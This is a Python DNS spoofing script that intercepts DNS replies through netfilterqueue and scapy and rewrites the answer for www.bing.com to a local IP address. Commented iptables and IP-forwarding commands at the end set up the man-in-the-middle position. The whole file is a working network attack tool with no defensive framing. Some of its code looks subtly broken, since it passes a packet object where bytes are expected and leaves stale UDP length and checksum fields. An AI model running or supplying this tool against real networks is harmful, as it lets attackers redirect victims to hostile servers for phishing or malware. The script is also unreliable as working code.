#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname.decode():
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.110.138")
            scapy_packet[scapy.DNS].an = answer

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum

            packet.set_payload(scapy_packet)

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

#iptables --flush
#iptables -I OUTPUT -j NFQUEUE --queue-num 0
#iptables -I INPUT -j NFQUEUE --queue-num 0
#iptables -I FORWARD -j NFQUEUE --queue-num 0
# echo 1 > /proc/sys/net/ipv4/ip_forward